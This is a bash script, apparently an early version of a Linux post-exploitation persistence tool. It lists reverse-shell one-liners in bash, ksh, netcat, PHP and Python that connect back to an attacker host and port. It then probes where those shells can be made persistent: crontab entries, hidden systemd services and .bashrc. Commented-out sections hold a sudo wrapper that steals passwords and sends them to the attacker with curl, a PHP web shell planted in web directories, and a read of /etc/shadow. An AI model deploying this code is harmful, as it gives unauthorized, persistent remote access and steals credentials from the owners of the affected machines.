#!/bin/bash

# Modular version

# The basic idea is that you have commands that can execute reverse shells (methods, e.g. bash) and ways to make those shells persist on the system (doors, e.g. crontab)
# The script will enumerate all methods available and for each, enumerate all doors
# The goal is to eventually make it to where it will install a reverse shell everywhere it can for each method, with an option to do a dry run and not install anything, just enumerate everything

attackBox=0.0.0.0
attackPort=5253
cron="* * * * *"

touch /dev/shm/.linpay

methods=(
	# array entry format = method, eval statement, payload: <- the ":" is important, and the spaces around the commas
	# method = command that starts the reverse shell
	# eval statement = if return true, then we can do what we want with the command
	# NOTE: the eval statement is meant to account for the times where you can execute a command, therefore the exit status = 0 but the command itself prevents you from doing what you want (e.g. you can excute easy_install as any user but only install things as root [by default], and you can install a persistence script)
	# payload = just the bare minimum to run the reverse shell, the extra needed to install the payload somewhere (e.g. cron schedule) is handled in "doors"
	"bash , if bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
	"ksh , if ksh -c 'exit' , ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
	"nc , if $(nc -w 1 -lnvp 5253 &> /dev/null & nc 0.0.0.0 5253 &> /dev/null) , nc $attackBox $attackPort -e $SHELL:"
	"php , if php -r \"exit();\" , php -r \"set_time_limit (0);\$ip = '$attackBox';\$port = $attackPort;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"ERROR Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip \$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }:"
	"python , if python -c 'import socket,subprocess,os;exit()' , python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
	"python2 , if python2 -c 'import socket,subprocess,os;exit()' , python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
	"python2.7 , if python2.7 -c 'import socket,subprocess,os;exit()' , python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
	"python3 , if python3 -c 'import socket,subprocess,os;exit()' , python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
	"python3.8 , if python3.8 -c 'import socket,subprocess,os;exit()' , python3.8 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
)

doors=(
	# array entry format = door , eval statement , hinge: <- the ":" is important, and the spaces around the commas
	# door = command
	# eval statement = same as above
	# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
	"crontab , if crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron; cat /dev/shm/.cron | grep -v linper > /dev/shm/.rcron; crontab /dev/shm/.rcron; if grep -qi [A-Za-z0-9] /dev/shm/.rcron; then crontab /dev/shm/.rcron; else crontab -r; fi; grep linper -qi /dev/shm/.cron , echo \"$cron $(cat /dev/shm/.linpay)\" >> /dev/shm/.rcron; crontab /dev/shm/.rcron; rm /dev/shm/.rcron:"
	"systemctl , if touch /etc/systemd/.temp; rm /etc/systemd/.temp , export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
	"bashrc , if cd;find -writable -name .bashrc | grep -qi bashrc , echo \"$(cat /dev/shm/.linpay) 2> /dev/null & sleep .0001\" >> ~/.bashrc"
)

# pass paylod to doors
enum_methods() {
	IFS=":"
	for s in ${methods[@]};
	do
		method=$(echo $s | awk -F ' , ' '{print $1}')
		eval_statement=$(echo $s | awk -F ' , ' '{print $2}' | sed 's/^...//g')
		payload=$(echo $s | awk -F ' , ' '{print $3}')
		if $(echo $method | grep -qi "[a-z]")
		then
			#echo "method = " $method
			#echo "eval staement = " $eval_statement
			#echo "payload = " $payload
			#echo
			#echo "$eval_statement"
			echo "$eval_statement" | $SHELL 2> /dev/null
			if [ $? -eq 0 ];
			then
				echo -e "\e[92m[+]\e[0m Method Found: $method"
				enum_doors $payload
			fi
		fi
	done
}

# enumerate where all backdoors can be placed
enum_doors() {
	IFS=":"
	for s in ${doors[@]};
	do
		if $(echo $payload | grep -qi "[a-z]")
		then
			door=$(echo $s | awk -F ' , ' '{print $1}')
			#echo "door = " $door
			eval_statement=$(echo $s | awk -F ' , ' '{print $2}' | sed 's/^...//g')
			#echo "eval = " $eval_statement
			hinge=$(echo $s | awk -F ' , ' '{print $3}')
			#echo "hinge = " $hinge
			#echo "----------------------------"
			if $(echo $door | grep -qi "[a-z]")
			then
				#echo "method = " $method
				#echo "eval staement = " $eval_statement
				#echo "payload = " $payload
				#echo
				#echo "$eval_statement"
				echo "$eval_statement" | $SHELL 2> /dev/null
				if [ $? -eq 0 ];
				then
					if echo $door | grep -qi "[a-z]";
					then
						#hinge=$(cat /dev/shm/.linpay)
						echo "[+] Door Found: $door"
						#echo "eval = $eval_statement"
						#echo "hinge = $hinge"
						#echo "1 = $1"
					fi
				fi
			fi
		fi
	done
	echo "-----------------------"
}

sudo_hijack_attack () {
if $(cat /etc/group | grep sudo | grep -qi $(whoami));
then
	echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
	echo "-----------------------"
	#echo 'function sudo () {
	#	realsudo="$(which sudo)"
	#	passwdfile="'$passwdfile'"
	#	read -s -p "[sudo] password for $USER: " inputPasswd
	#	printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $passwdfile
	#	sort -uo "$passwdfile" "$passwdfile"
	#	encoded=$(cat "$passwdfile" | base64) > /dev/null 2>&1
	#	curl -k -s "https://'$attackBox'/$encoded" > /dev/null 2>&1
	#	$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
	#	$realsudo "${@:1}"
	#	}' >> ~/.bashrc
	#echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
	#echo -e "\e[92m[+]\e[0m Stored in $passwdfile"
fi
}

webserver_poison_attack () {
	if $(grep -qi "www-data" /etc/passwd)
	then
		echo -e "\e[92m[+]\e[0m Web Server Poison Attack Available for the Following Directories"
		for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -type d);
		do
			echo "$i"
		#	export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
		#	echo "<?php set_time_limit (0);\$ip = '$attackBox';\$port = $attackPort;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
		#	echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
		done
	fi
	echo "-----------------------"
}


main (){
	enum_methods
	sudo_hijack_attack
	webserver_poison_attack
}

main

#attackBox=0.0.0.0
#attackPort=5253
#cron="* * * * *"
#passwdfile=$(mktemp)
#
#if [ "$EUID" -eq 0 ];
#then
#	root="yes"
#fi
#
#if $(id | grep -qi "www-data");
#then
#	wwwdata="yes"
#fi
#
#if $(which bash | grep -qi bash);
#then
#	bash="yes"
#fi
#
#if $(which ksh | grep -qi ksh);
#then
#	ksh="yes"
#then
#
#if $(which python | grep -qi python);
#then
#	python="yes"
#fi
#
#if $(which python3 | grep -qi python);
#then
#	python3="yes"
#fi
#
#if $(which nc | grep -qi nc);
#then
#	nc="yes"
#fi
#
#if $(which php | grep -qi php);
#then
#	php="yes"
#fi
#
#if $(env | grep -qi "HOME")
#then
#	home="yes"
#fi
#
#if $(which crontab | grep -qi crontab)
#then
#	crontab="yes"
#fi
#
#if $(cat /etc/group | grep sudo | grep -qi $(whoami))
#then
#	sudo="yes"
#fi
#
#if $(which systemctl | grep -qi systemctl)
#then
#	systemctl="yes"
#	export bash_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
#	export python_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
#	export python3_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
#	export netcat_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
#fi
#
#if [ "$wwwdata" == "yes" ];
#then
#	if [ "$php" == "yes" ];
#	then 
#		for i in $(find $(grep --color=never www-data /etc/passwd | awk -F: '{print $6}') -type d);
#		do
#			export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
#			echo "<?php set_time_limit (0);\$ip = '$attackBox';\$port = $attackPort;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
#			echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
#		done
#			fi
#			fi
#
#			if [ "$crontab" == "yes" ];
#			then
#				crontab -l 2> /dev/null > /dev/shm/.cron.sh
#				if [ "$bash" == "yes" ];
#				then
#					echo "$cron bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1'" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in crontab"
#				fi
#				if [ "$ksh" == "yes" ];
#				then
#					echo "$cron ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1'" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Zsh reverse shell loaded in crontab"
#				fi
#				if [ "$python" == "yes" ];
#				then
#					echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Python reverse shell loaded in crontab"
#				fi
#				if [ "$python3" == "yes" ];
#				then
#					echo "$cron python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in crontab"
#				fi
#				if [ "$nc" == "yes" ];
#				then
#					echo "$cron nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/.cron.sh
#					echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in crontab"
#				fi
#				crontab /dev/shm/.cron.sh
#				rm /dev/shm/.cron.sh
#			fi
#
#			if [ "$home" == "yes" ];
#			then
#				if [ "$bash" == "yes" ];
#				then
#					echo "bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1' 2> /dev/null & sleep .0001" >> ~/.bashrc
#					echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in $(whoami)'s bashrc"
#				fi
#				if [ "$python" == "yes" ];
#				then
#					echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
#					echo -e "\e[92m[+]\e[0m Python reverse shell loaded in $(whoami)'s bashrc"
#				fi
#				if [ "$python3" == "yes" ];
#				then
#					echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
#					echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in $(whoami)'s bashrc"
#				fi
#				if [ "$nc" == "yes" ];
#				then
#					echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
#					echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in $(whoami)'s bashrc"
#				fi
#				if [ "$sudo" == "yes" ];
#				then
#					echo 'function sudo () {
#					realsudo="$(which sudo)"
#					passwdfile="'$passwdfile'"
#					read -s -p "[sudo] password for $USER: " inputPasswd
#					printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $passwdfile
#					sort -uo "$passwdfile" "$passwdfile"
#					encoded=$(cat "$passwdfile" | base64) > /dev/null 2>&1
#					curl -k -s "https://'$attackBox'/$encoded" > /dev/null 2>&1
#					$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
#					$realsudo "${@:1}"
#				}' >> ~/.bashrc
#			echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
#			echo -e "\e[92m[+]\e[0m Stored in $passwdfile"
#				fi
#			fi
#
#			if [ "$root" == "yes" ];
#			then
#				if [ "$systemctl" == "yes" ];
#				then
#					if [ "$bash" == "yes" ];
#					then
#						echo "[Service]
#						Type=oneshot
#						ExecStartPre=$(which sleep) 60
#						ExecStart=$(which bash) -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1' 2> /dev/null & sleep .0001
#						[Install]
#						WantedBy=multi-user.target" > /etc/systemd/system/$bash_rev_shell_service
#						chmod 644 /etc/systemd/system/$bash_rev_shell_service
#						systemctl start $bash_rev_shell_service 2> /dev/null & sleep .0001
#						systemctl enable $bash_rev_shell_service 2> /dev/null & sleep .0001
#						echo -e "\e[92m[+]\e[0m Bash reverse shell installed as a service at /etc/systemd/system/$bash_rev_shell_service"
#
#					fi
#					if [ "$python" == "yes" ];
#					then
#						echo "[Service]
#						Type=oneshot
#						ExecStartPre=$(which sleep) 60
#						ExecStart=$(which python) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001
#						[Install]
#						WantedBy=multi-user.target" > /etc/systemd/system/$python_rev_shell_service
#						chmod 644 /etc/systemd/system/$python_rev_shell_service
#						systemctl start $python_rev_shell_service 2> /dev/null & sleep .0001
#						systemctl enable $python_rev_shell_service 2> /dev/null & sleep .0001
#						echo -e "\e[92m[+]\e[0m Python reverse shell installed as a service at /etc/systemd/system/$python_rev_shell_service"
#					fi
#					if [ "$python3" == "yes" ];
#					then
#						echo "[Service]
#						Type=oneshot
#						ExecStartPre=$(which sleep) 60
#						ExecStart=$(which python3) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001
#						[Install]
#						WantedBy=multi-user.target" > /etc/systemd/system/$python3_rev_shell_service
#						chmod 644 /etc/systemd/system/$python3_rev_shell_service
#						systemctl start $python3_rev_shell_service 2> /dev/null & sleep .0001
#						systemctl enable $python3_rev_shell_service 2> /dev/null & sleep .0001
#						echo -e "\e[92m[+]\e[0m Python3 reverse shell installed as a service at /etc/systemd/system/$python3_rev_shell_service"
#					fi
#					if [ "$nc" == "yes" ];
#					then
#						echo "[Service]
#						Type=oneshot
#						ExecStartPre=$(which sleep) 60
#						ExecStart=$(which nc) $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001
#						[Install]
#						WantedBy=multi-user.target" > /etc/systemd/system/$netcat_rev_shell_service
#						chmod 644 /etc/systemd/system/$netcat_rev_shell_service
#						systemctl start $netcat_rev_shell_service 2> /dev/null & sleep .0001
#						systemctl enable $netcat_rev_shell_service 2> /dev/null & sleep .0001
#						echo -e "\e[92m[+]\e[0m Netcat reverse shell installed as a service at /etc/systemd/system/$netcat_rev_shell_service"
#					fi
#				fi
#				if [ "$php" == "yes" ];
#				then 
#					for i in $(find $(grep --color=never www-data /etc/passwd | awk -F: '{print $6}') -type d);
#					do
#						export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
#						echo "<?php set_time_limit (0);\$ip = '$attackBox';\$port = $attackPort;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
#						echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
#					done
#						fi
#						echo -e "\e[92m[+]\e[0m Users with passwords from the shadow file"
#						egrep -v "\*|\!" /etc/shadow
#						fi
#
#						echo ""
#						echo -e "\e[92m[+]\e[0m All shells call back to $attackBox:$attackPort"
#
